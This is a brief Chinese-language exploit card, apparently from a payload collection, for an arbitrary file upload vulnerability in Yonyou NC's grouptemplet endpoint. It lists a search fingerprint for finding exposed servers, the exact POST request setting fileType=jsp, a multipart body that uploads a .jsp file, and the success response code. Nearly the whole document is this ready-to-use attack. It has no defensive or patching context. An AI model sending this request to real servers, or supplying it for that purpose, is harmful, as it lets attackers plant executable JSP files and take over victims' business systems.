# 用友NCgrouptemplet文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`title="YONYOU NC"`
- **请求**：`POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999 HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryEXmnamw5gVZG9KAQ
Content-Disposition: form-data; name="file"; filename="dudesite.jsp"
Content-Type: application/octet-stream
111111111111111111111
------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
```
- **响应特征**：200